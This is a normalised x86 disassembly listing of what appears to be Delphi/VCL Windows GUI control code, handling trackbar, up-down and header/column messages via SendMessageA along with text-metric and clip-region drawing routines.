mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_4191f8
dec eax
mov edx [ ebp - 0x4 ]
mov [ edx + 0x21c ] eax
jmp r-xdata
test al 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_453a88
lea ecx [ ebp - 0x39 ]
mov edx [ esi + 0xc ]
call sub_42ad7c
mov eax [ ebp - 0x4 ]
mov ebx [ ebp - 0x19 ]
mov [ eax + 0x218 ] ebx
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x21c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_439020
push eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_439020
mov edx eax
mov eax [ ebp - 0x4 ]
pop ecx
call sub_439f9c
mov edx [ ebp - 0x4 ]
mov [ edx + 0x211 ] al
jmp r-xdata
mov eax [ esi + 0x14 ]
mov esi eax
mov eax [ ebx + 0x14 ]
cmp eax [ esi + 0x4 ]
jle r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x230 ] ebx
mov eax [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x234 ] eax
call GetMessagePos
mov edx eax
and edx 0xffff
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x238 ] edx
shr eax 0x10
mov edx [ ebp - 0x4 ]
mov [ edx + 0x23c ] eax
mov eax [ ebp - 0x4 ]
add eax 0x238
push eax
mov eax [ ebp - 0x4 ]
call sub_453a88
push eax
call ScreenToClient
mov eax [ ebx + 0x18 ]
cmp eax [ esi + 0x4 ]
jge r-xdata
mov [ esi + 0x4 ] eax
mov al [ ebp - 0x5 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov si 0xffae
call sub_40338c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x5 ] 0x2
jne r-xdata
mov [ esi + 0x4 ] eax
retn
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x230 ] edx
sub_439ca0
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x220 ] 0x0
je r-xdata
xor eax eax
pop ecx
pop ebp
retn
push 0x0
lea eax [ ebp - 0x4 ]
push eax
push 0x0
push 0x26
call SystemParametersInfoA
test eax eax
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov al 0x1
pop ecx
pop ebp
retn
sub_439cd8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi edx
mov [ ebp - 0x4 ] eax
cmp [ edi ] 0x200
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_45149c
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
push ebp
call sub_439ca0
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_44d3b4
test al al
je r-xdata
movsx ebx [ edi + 0x8 ]
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x238 ]
mov eax [ ebp - 0x4 ]
add ebx [ eax + 0x234 ]
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x230 ]
mov eax [ esi + 0x14 ]
cmp ebx eax
jge r-xdata
mov eax [ esi + 0x18 ]
cmp ebx eax
jle r-xdata
sub ebx eax
mov [ ebp - 0x5 ] 0x1
push 0x1
mov edx esi
mov ecx ebx
mov eax [ ebp - 0x4 ]
mov si 0xffae
call sub_40338c
cmp [ ebp - 0x5 ] 0x0
je r-xdata
sub ebx eax
mov [ ebp - 0x5 ] 0x1
sub [ edi + 0x8 ] bx
sub_439d7c
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov ebx eax
movsx eax [ edi + 0x8 ]
mov [ esp ] eax
movsx eax [ edi + 0xa ]
mov [ esp + 0x4 ] eax
mov eax esp
push eax
push 0x0
push 0x1206
mov eax ebx
call sub_453a88
push eax
call SendMessageA
mov esi eax
test esi esi
jl r-xdata
mov edx edi
mov eax ebx
call sub_44e810
test [ esp + 0x8 ] 0x2
je r-xdata
mov edx esi
mov eax [ ebx + 0x208 ]
call sub_439020
cmp [ eax + 0x1e ] 0x0
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_439ddc
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_452074
mov eax [ ebp - 0x4 ]
call sub_453d8c
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x2
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403160
mov [ ebp - 0x14 ] eax
xor edx edx
push ebp
push sub_439f77
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
call sub_44cb90
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_4191f8
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
inc edi
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
call sub_403190
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor edx edx
push ebp
push sub_439f5a
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ esi + 0x10 ]
sub [ ebp - 0xc ] eax
mov edx esi
mov eax [ ebp - 0x14 ]
call sub_418314
jmp r-xdata
mov eax [ ebp - 0xc ]
cdq
idiv [ ebp - 0x8 ]
mov edi eax
mov ebx [ ebp - 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ ebp - 0x14 ]
call sub_418470
mov esi eax
test ebx ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov edx ebx
call sub_439020
mov esi eax
cmp [ esi + 0x1f ] 0x0
je r-xdata
inc ebx
dec edi
jne r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
je r-xdata
mov edx ebx
mov eax [ ebp - 0x14 ]
call sub_418470
mov esi eax
test ebx ebx
jne r-xdata
mov edx edi
mov eax esi
call sub_438f78
dec ebx
cmp ebx 0xffffffff
jne r-xdata
add edi [ ebp - 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
cmp eax [ ebp - 0x8 ]
jne r-xdata
cmp edi [ esi + 0x10 ]
je r-xdata
add edi [ ebp - 0x10 ]
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
cdq
idiv [ ebp - 0x8 ]
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0xc ]
cdq
idiv [ ebp - 0x8 ]
mov edi eax
mov ebx [ ebp - 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x14 ]
call sub_418360
mov eax [ esi + 0x10 ]
sub [ ebp - 0xc ] eax
sub_439f9c
push esi
push edi
push ecx
mov edi edx
mov esi eax
mov [ esp ] 0x1
push esp
mov edx edi
mov eax esi
mov si 0xffb1
call sub_40338c
mov al [ esp ]
pop edx
pop edi
pop esi
retn
sub_439fbc
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_44c65c
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x228 ]
jne r-xdata
xor edx edx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xd0 ]
sub_439ff0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x228 ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x228 ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x224 ]
call sub_45b364
mov eax ebx
call sub_453a88
xor edx edx
call sub_42ad98
mov edx [ ebx + 0x224 ]
call sub_45b3a8
mov edx ebx
mov eax [ ebx + 0x228 ]
call sub_420824
mov eax [ ebx + 0x228 ]
call sub_45a690
push eax
mov eax ebx
call sub_453a88
pop edx
call sub_42ad98
jmp r-xdata
mov eax ebx
call sub_439844
pop esi
pop ebx
retn
sub_43a064
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_45a690
push eax
mov eax ebx
call sub_453a88
pop edx
call sub_42ad98
mov eax ebx
call sub_439844
pop esi
pop ebx
retn
sub_43a08c
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x262 ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x264 ]
call [ ebx + 0x260 ]
sub_43a0dc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_43a1fb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov [ eax + 0x210 ] 0x1
xor eax eax
push ebp
push sub_43a1d8
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebx + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_419198
push eax
mov eax esi
call sub_418e68
mov edx eax
pop eax
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_4191f8
push eax
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_4050d4
add esp 0x4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_4191f8
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_4191f8
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_453a88
mov ecx [ ebp - 0x4 ]
pop edx
call sub_42ada8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43a1df
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov [ eax + 0x210 ] 0x0
retn
inc esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x208 ]
mov edx ebx
call sub_439020
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + ebx * 4 ] eax
inc ebx
dec esi
jne r-xdata
sub_43a208
push ebp
mov ebp esp
push ecx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x211 ] 0x0
push ebp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x21c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_439020
push eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x218 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_439020
pop edx
call sub_43a0dc
pop ecx
mov eax [ ebp - 0x4 ]
mov si 0xffb0
call sub_40338c
pop esi
pop ecx
pop ebp
retn
sub_43a284
push ebx
push ecx
mov ebx eax
mov eax [ r-xdata ]
mov [ esp ] eax
cmp [ ebx + 0x272 ] 0x0
je r-xdata
mov ecx [ ebx + 0x208 ]
mov dl 0x1
mov eax [ esp ]
call [ eax + 0x1c ]
pop edx
pop ebx
retn
mov ecx esp
mov edx ebx
mov eax [ ebx + 0x274 ]
call [ ebx + 0x270 ]
sub_43a2cc
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_44f7b4
mov edx 0x96
mov eax esi
call sub_44c948
mov edx 0x2d
mov eax esi
call sub_44c96c
mov dl 0x1
mov eax esi
call sub_453cbc
xor eax eax
mov [ esi + 0x21c ] eax
mov [ esi + 0x220 ] 0xa
xor eax eax
mov [ esi + 0x228 ] eax
mov [ esi + 0x20c ] 0x1
mov [ esi + 0x210 ] 0x2
mov [ esi + 0x224 ] 0x1
xor eax eax
mov [ esi + 0x22c ] eax
xor eax eax
mov [ esi + 0x230 ] eax
mov [ esi + 0x214 ] 0x14
mov [ esi + 0x209 ] 0x0
mov [ esi + 0x20a ] 0x1
mov [ esi + 0x208 ] 0x0
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov [ esi + 0x218 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034f4
mov eax esi
pop esi
pop ebx
retn
call sub_40354c
pop [ fs : 0x0 ]
add esp 0xc
sub_43a3a4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax 0x4
call sub_437cf4
mov edx esi
mov eax ebx
call sub_450914
mov ecx r-xdata
mov edx esi
mov eax ebx
call sub_450840
mov eax [ ebx + 0x220 ]
sub eax [ ebx + 0x21c ]
cmp eax 0x2710
setg al
and eax 0x7f
lea eax [ eax + eax * 2 ]
lea eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x20a ]
mov eax [ eax + edx * 4 ]
mov edx [ esi + 0x4 ]
xor ecx ecx
mov cl [ ebx + 0x208 ]
or edx [ ecx * 4 + rw-data ]
or eax edx
xor edx edx
mov dl [ ebx + 0x209 ]
or eax [ edx * 4 + rw-data ]
or eax 0x40
or eax 0x20
mov [ esi + 0x4 ] eax
mov eax [ esi + 0x24 ]
and eax 0xfffffffc
or eax 0x8
mov [ esi + 0x24 ] eax
cmp [ ebx + 0x218 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
or [ esi + 0x4 ] 0x80
sub_43a456
add [ eax ] al
push ebx
mov ebx eax
mov eax ebx
call sub_450a40
mov eax ebx
call sub_453d8c
test al al
je r-xdata
pop ebx
retn
push 0x0
mov eax [ ebx + 0x214 ]
push eax
push 0x41b
mov eax ebx
call sub_453a88
push eax
call SendMessageA
mov eax [ ebx + 0x20c ]
push eax
push 0x0
push 0x417
mov eax ebx
call sub_453a88
push eax
call SendMessageA
mov eax [ ebx + 0x210 ]
push eax
push 0x0
push 0x415
mov eax ebx
call sub_453a88
push eax
call SendMessageA
mov eax [ ebx + 0x21c ]
push eax
push 0x0
push 0x407
mov eax ebx
call sub_453a88
push eax
call SendMessageA
mov eax [ ebx + 0x220 ]
push eax
push 0x0
push 0x408
mov eax ebx
call sub_453a88
push eax
call SendMessageA
mov eax ebx
call sub_43a93c
mov eax [ ebx + 0x228 ]
push eax
push 0x1
push 0x405
mov eax ebx
call sub_453a88
push eax
call SendMessageA
push 0x1
mov eax [ ebx + 0x224 ]
push eax
push 0x414
mov eax ebx
call sub_453a88
push eax
call SendMessageA
sub_43a540
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
push 0x0
push 0x0
push 0x400
mov eax ebx
call sub_453a88
push eax
call SendMessageA
mov [ ebx + 0x228 ] eax
mov eax ebx
mov si 0xffb3
call sub_40338c
xor eax eax
mov [ edi + 0xc ] eax
pop edi
pop esi
pop ebx
retn
sub_43a580
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
push 0x0
push 0x0
push 0x400
mov eax ebx
call sub_453a88
push eax
call SendMessageA
mov [ ebx + 0x228 ] eax
mov eax ebx
mov si 0xffb3
call sub_40338c
xor eax eax
mov [ edi + 0xc ] eax
pop edi
pop esi
pop ebx
retn
sub_43a5c0
push ebx
mov ebx eax
mov eax ebx
call sub_453d8c
test al al
je r-xdata
mov eax [ ebx + 0x214 ]
pop ebx
retn
push 0x0
push 0x0
push 0x41c
mov eax ebx
call sub_453a88
push eax
call SendMessageA
pop ebx
retn
sub_43a5f0
push ebx
push esi
mov ebx eax
cmp dl [ ebx + 0x208 ]
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x208 ] dl
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov eax ebx
call sub_451028
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x84 ]
sub_43a644
push ebp
mov ebp esp
add esp 0xfffffef0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x110 ] ebx
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov edi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_43a7ba
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi edi
jle r-xdata
cmp esi [ ebp - 0x4 ]
jle r-xdata
lea edx [ ebp - 0x10c ]
mov eax [ ebx ]
call sub_4030e0
lea eax [ ebp - 0x10c ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x4
lea eax [ ebp - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x110 ]
mov eax [ rw-data ]
call sub_405c50
mov ecx [ ebp - 0x110 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8a0
call sub_40395c
cmp edi [ ebp - 0x4 ]
jge r-xdata
mov [ ebp - 0x4 ] esi
mov eax edi
sub eax esi
cmp eax 0x2710
setg al
mov edx [ ebx + 0x220 ]
sub edx [ ebx + 0x21c ]
cmp edx 0x2710
setg dl
cmp al dl
je r-xdata
mov [ ebp - 0x4 ] edi
cmp esi [ ebx + 0x21c ]
je r-xdata
mov [ ebx + 0x21c ] esi
mov [ ebx + 0x220 ] edi
mov eax ebx
call sub_451028
cmp edi [ ebx + 0x220 ]
je r-xdata
mov [ ebx + 0x21c ] esi
mov eax ebx
call sub_453d8c
test al al
je r-xdata
mov eax [ ebx + 0x228 ]
cmp eax [ ebp - 0x4 ]
je r-xdata
mov [ ebx + 0x220 ] edi
mov eax ebx
call sub_453d8c
test al al
je r-xdata
push esi
push 0x1
push 0x407
mov eax ebx
call sub_453a88
push eax
call SendMessageA
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43a7c1
lea eax [ ebp - 0x110 ]
call sub_403f20
retn
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x228 ] eax
mov eax ebx
call sub_453d8c
test al al
je r-xdata
push edi
push 0x1
push 0x408
mov eax ebx
call sub_453a88
push eax
call SendMessageA
mov eax ebx
mov si 0xffb3
call sub_40338c
mov eax [ ebp - 0x4 ]
push eax
push 0x1
push 0x405
mov eax ebx
call sub_453a88
push eax
call SendMessageA
sub_43a814
push ebx
mov ebx eax
cmp edx [ ebx + 0x224 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x224 ] edx
mov eax ebx
call sub_453d8c
test al al
je r-xdata
push 0x1
mov eax [ ebx + 0x224 ]
push eax
push 0x414
mov eax ebx
call sub_453a88
push eax
call SendMessageA
sub_43a878
push ebx
mov ebx eax
cmp edx [ ebx + 0x20c ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x20c ] edx
mov eax ebx
call sub_453d8c
test al al
je r-xdata
mov eax [ ebx + 0x20c ]
push eax
push 0x0
push 0x417
mov eax ebx
call sub_453a88
push eax
call SendMessageA
sub_43a8b4
push ebx
mov ebx eax
cmp edx [ ebx + 0x210 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x210 ] edx
mov eax ebx
call sub_453d8c
test al al
je r-xdata
mov eax [ ebx + 0x210 ]
push eax
push 0x0
push 0x415
mov eax ebx
call sub_453a88
push eax
call SendMessageA
sub_43a8f0
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x214 ]
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x214 ] esi
mov eax ebx
call sub_453d8c
test al al
je r-xdata
push 0x0
push esi
push 0x41b
mov eax ebx
call sub_453a88
push eax
call SendMessageA
sub_43a93c
push ebx
mov ebx eax
mov eax ebx
call sub_453d8c
test al al
je r-xdata
pop ebx
retn
cmp [ ebx + 0x22c ] 0x0
jne r-xdata
mov dx [ ebx + 0x230 ]
mov ax [ ebx + 0x22c ]
call sub_406a94
push eax
push 0x1
push 0x40a
mov eax ebx
call sub_453a88
push eax
call SendMessageA
cmp [ ebx + 0x230 ] 0x0
jne r-xdata
push 0x0
push 0x1
push 0x413
mov eax ebx
call sub_453a88
push eax
call SendMessageA
jmp r-xdata
sub_43a9e8
push ebx
push esi
push edi
push ebp
add esp 0xffffffd0
mov edi edx
mov ebx eax
call sub_43c850
call sub_43c930
test al al
je r-xdata
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ edi + 0x8 ]
cmp [ eax + 0x8 ] 0xfffffff4
jne r-xdata
add esp 0x30
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebp eax
mov eax [ ebp + 0xc ]
dec eax
je r-xdata
mov [ edi + 0xc ] 0x20
jmp r-xdata
sub eax 0x10000
je r-xdata
mov eax [ ebp + 0x24 ]
dec eax
je r-xdata
jmp r-xdata
lea edx [ esp + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax ebx
mov si 0xffb5
call sub_40338c
test al al
je r-xdata
sub eax 0x2
je r-xdata
xor eax eax
mov [ edi + 0xc ] eax
jmp r-xdata
push 0x0
push 0x0
lea eax [ esp + 0xc ]
push eax
mov eax ebx
call sub_453a88
push eax
call sub_43c850
mov ecx [ ebp + 0x10 ]
pop edx
call sub_43cac8
jmp r-xdata
push 0x0
xor ecx ecx
mov edx 0x129
mov eax ebx
call sub_44e340
test al 0x1
jne r-xdata
lea eax [ esp + 0x4 ]
push eax
push 0x0
push 0x419
mov eax ebx
call sub_453a88
push eax
call SendMessageA
xor eax eax
mov [ esp ] eax
mov eax ebx
mov si 0xffb5
call sub_40338c
test al al
je r-xdata
jmp r-xdata
xor eax eax
mov [ edi + 0xc ] eax
jmp r-xdata
push 0xffffffff
push 0xffffffff
lea eax [ esp + 0xc ]
push eax
call InflateRect
cmp [ ebx + 0x208 ] 0x0
jne r-xdata
inc [ esp ]
lea edx [ esp + 0x20 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ esp + 0x24 ]
add eax [ esp ]
mov [ esp + 0x8 ] eax
lea edx [ esp + 0x20 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ esp + 0x2c ]
sub eax [ esp ]
mov [ esp + 0x10 ] eax
lea edx [ esp + 0x20 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ esp + 0x20 ]
add eax [ esp ]
mov [ esp + 0x4 ] eax
lea edx [ esp + 0x20 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ esp + 0x28 ]
sub eax [ esp ]
mov [ esp + 0xc ] eax
jmp r-xdata
mov eax [ esp + 0x10 ]
push eax
mov eax [ esp + 0x10 ]
push eax
mov eax [ esp + 0x10 ]
push eax
mov eax [ esp + 0x10 ]
push eax
call CreateRectRgn
mov esi eax
push esi
mov eax [ ebp + 0x10 ]
push eax
call SelectClipRgn
call sub_43c850
lea ecx [ esp + 0x14 ]
mov dl 0x22
call sub_43cd40
lea eax [ esp + 0x14 ]
push eax
push 0x0
push 0x0
mov eax ebx
call sub_453a88
push eax
call sub_43c850
mov ecx [ ebp + 0x10 ]
pop edx
call sub_43cac8
push esi
call DeleteObject
push 0x0
mov eax [ ebp + 0x10 ]
push eax
call SelectClipRgn
sub_43abbc
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov ebx eax
call sub_43c850
call sub_43c930
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_451edc
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax ebx
mov si 0xffb5
call sub_40338c
test al al
je r-xdata
push 0x0
push 0x0
lea eax [ esp + 0x8 ]
push eax
mov eax ebx
call sub_453a88
push eax
call sub_43c850
mov ecx [ edi + 0x4 ]
pop edx
call sub_43cac8
mov [ edi + 0xc ] 0x1
jmp r-xdata
push 0x0
xor ecx ecx
mov edx 0x129
mov eax ebx
call sub_44e340
test al 0x1
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
push 0xffffffff
push 0xffffffff
lea eax [ esp + 0x8 ]
push eax
call InflateRect
sub_43ac70
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_44f7b4
mov edx 0x79
mov eax esi
call sub_44c948
mov edx 0x19
mov eax esi
call sub_44c96c
mov dl 0x1
mov eax esi
call sub_453cbc
xor edx edx
mov eax esi
call sub_44d350
mov [ esi + 0x208 ] 0x1
mov al [ r-xdata ]
mov [ esi + 0x20a ] al
mov al [ r-xdata ]
mov [ esi + 0x209 ] al
mov [ esi + 0x20c ] 0x41
mov eax esi
call sub_43af28
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034f4
mov eax esi
pop esi
pop ebx
retn
call sub_40354c
pop [ fs : 0x0 ]
add esp 0xc
sub_43acfd
add [ eax ] al
add [ eax + eax ] al
add [ eax ] al
push ebx
push esi
mov esi edx
mov ebx eax
mov eax 0x40
call sub_437cf4
mov edx esi
mov eax ebx
call sub_450914
mov ecx r-xdata
mov edx esi
mov eax ebx
call sub_450840
and [ esi + 0x24 ] 0xfffffffc
pop esi
pop ebx
retn
sub_43ad44
push ebx
mov ebx eax
mov eax ebx
call sub_450a40
xor eax eax
mov al [ ebx + 0x209 ]
xor edx edx
call sub_406a94
push eax
xor eax eax
mov al [ ebx + 0x20a ]
push eax
push 0x403
mov eax ebx
call sub_453a88
push eax
call SendMessageA
push 0x0
mov dl [ ebx + 0x209 ]
mov al [ ebx + 0x20c ]
call sub_406a80
movzx eax ax
push eax
push 0x401
mov eax ebx
call sub_453a88
push eax
call SendMessageA
pop ebx
retn
sub_43adb8
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ ebx + 0x209 ]
cmp al [ esp ]
je r-xdata
pop edx
pop ebx
retn
mov al [ esp ]
mov [ ebx + 0x209 ] al
xor eax eax
mov al [ esp ]
xor edx edx
call sub_406a94
push eax
xor eax eax
mov al [ ebx + 0x20a ]
push eax
push 0x403
mov eax ebx
call sub_453a88
push eax
call SendMessageA
push 0x0
mov dl [ ebx + 0x209 ]
mov al [ ebx + 0x20c ]
call sub_406a80
movzx eax ax
push eax
push 0x401
mov eax ebx
call sub_453a88
push eax
call SendMessageA
sub_43ae28
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ ebx + 0x20a ]
cmp al [ esp ]
je r-xdata
pop edx
pop ebx
retn
mov al [ esp ]
mov [ ebx + 0x20a ] al
xor eax eax
mov al [ ebx + 0x209 ]
xor edx edx
call sub_406a94
push eax
xor eax eax
mov al [ esp + 0x4 ]
push eax
push 0x403
mov eax ebx
call sub_453a88
push eax
call SendMessageA
push 0x0
mov dl [ ebx + 0x209 ]
mov al [ ebx + 0x20c ]
call sub_406a80
movzx eax ax
push eax
push 0x401
mov eax ebx
call sub_453a88
push eax
call SendMessageA
sub_43ae98
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x402
mov eax ebx
call sub_453a88
push eax
call SendMessageA
mov edx eax
mov eax ebx
call sub_43b020
pop ebx
retn
sub_43aebc
push ebx
mov ebx eax
mov eax ebx
call sub_43afd0
push 0x0
mov dl [ ebx + 0x209 ]
mov al [ ebx + 0x20c ]
call sub_406a80
movzx eax ax
push eax
push 0x401
mov eax ebx
call sub_453a88
push eax
call SendMessageA
pop ebx
retn
sub_43aef4
push ebx
mov ebx eax
cmp [ ebx + 0x208 ] 0x0
je r-xdata
mov eax [ r-xdata ]
not eax
and eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
pop ebx
retn
mov eax [ r-xdata ]
or eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
mov eax ebx
call sub_43af28
pop ebx
retn
sub_43af28
push ebx
push esi
push edi
add esp 0xffffff90
mov esi eax
push 0x0
call GetDC
mov ebx eax
push esp
push ebx
call GetTextMetricsA
mov eax [ esi + 0x68 ]
call sub_423a54
push eax
push ebx
call SelectObject
mov edi eax
lea eax [ esp + 0x38 ]
push eax
push ebx
call GetTextMetricsA
push edi
push ebx
call SelectObject
push ebx
push 0x0
call ReleaseDC
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov ebx [ esp ]
mov eax [ esp + 0x38 ]
cmp ebx eax
jle r-xdata
cmp [ esi + 0x1a5 ] 0x0
je r-xdata
push 0x6
call GetSystemMetrics
shl eax 0x2
test ebx ebx
jns r-xdata
mov ebx eax
mov ebx 0x6
mov ebx 0x8
jmp r-xdata
sar ebx 0x2
add eax ebx
mov ebx eax
add ebx 0x3
mov edx [ esp + 0x38 ]
add edx ebx
mov eax esi
call sub_44c96c
add esp 0x70
pop edi
